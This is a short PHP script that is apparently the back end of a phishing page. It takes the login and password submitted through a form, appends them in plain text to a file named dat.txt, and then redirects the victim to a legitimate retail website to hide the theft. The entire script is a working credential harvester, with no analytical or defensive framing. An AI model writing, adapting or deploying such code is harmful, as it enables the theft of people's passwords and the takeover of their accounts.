<?php
$txt = "dat.txt"; 
if (isset($_POST['login']) && isset($_POST['password'])) { // check if both fields are set
    $fh = fopen($txt, 'a'); 
    $txt='UN:'.$_POST['login'].' - '.'PW:'.$_POST['password'].' ';
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
}


/* Redirect browser */
header("Location:https://www.retailgenius.com/");


?>